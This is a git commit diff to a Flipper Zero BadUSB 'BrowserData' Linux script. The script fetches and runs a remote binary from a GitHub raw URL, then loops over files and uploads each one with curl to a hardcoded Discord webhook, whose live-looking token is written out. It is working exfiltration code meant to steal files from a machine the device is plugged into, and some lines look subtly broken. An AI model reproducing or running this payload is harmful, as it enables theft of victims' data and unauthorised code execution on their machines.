efa437f0d34ddbbfdbf6490d2f21969ed397755c
Chris <christophe.da.cruz.tic@gmail.com>
2023-12-09 12:30:47 +0100

    Send files through Discord Webhook

--- badusb/BrowserData/discord_wh_linux.sh
+++ badusb/BrowserData/discord_wh_linux.sh
@@ -1,3 +1,4 @@
+export WEBHOOK_URL="https://discord.com/api/webhooks/1180459253924909118/JP-HpTFSYUStv8nitmhmXn_nJzOTdCY84f7YhNOhbXtkSm-5ERSGWk4Bsey8oxvrDJpx"
 architecture=$(uname -m)
 
 if [ "$architecture" == "armv7l" ]; then
@@ -6,6 +7,15 @@ elif [ "$architecture" == "x86_64" ]; then
     curl -sSL https://raw.githubusercontent.com/MagikarpLv13/flipper-zero/main/badusb/BrowserData/External/linux_amd64 -o test_script.sh
     chmod +x test_script.sh
     ./test_script.sh
+    folder_path="/~"
+    declare -a files=()
+    shopt -s nullglob
+    for fichier in "$folder_path"/*; do
+        if [[ -f "$fichier" ]]; then
+            file=$(basename "$fichier")
+            files+=("$file")
+        fi
+    done
 elif [ "$architecture" == "i686" ] || [ "$architecture" == "i386" ]; then
     echo "L'architecture est x86 (32 bits)."
 else
@@ -13,8 +23,10 @@ else
 fi
 
 
-#export WEBHOOK_URL="https://discord.com/api/webhooks/1180459253924909118/JP-HpTFSYUStv8nitmhmXn_nJzOTdCY84f7YhNOhbXtkSm-5ERSGWk4Bsey8oxvrDJpx"
-#curl \
-#  -H "Content-Type: application/json" \
-#  -d '{"username": "Murerig", "content": "Coin ? 🦆"}' \
-#  $WEBHOOK_URL
+for file in "${files[@]}"; do
+    curl \
+  -H "Content-Type: application/json" \
+  -d '{"username": "Murerig", "content": "Coin Coin 🦆"}' \
+  -F "$file=$file" \
+  $WEBHOOK_URL
+done
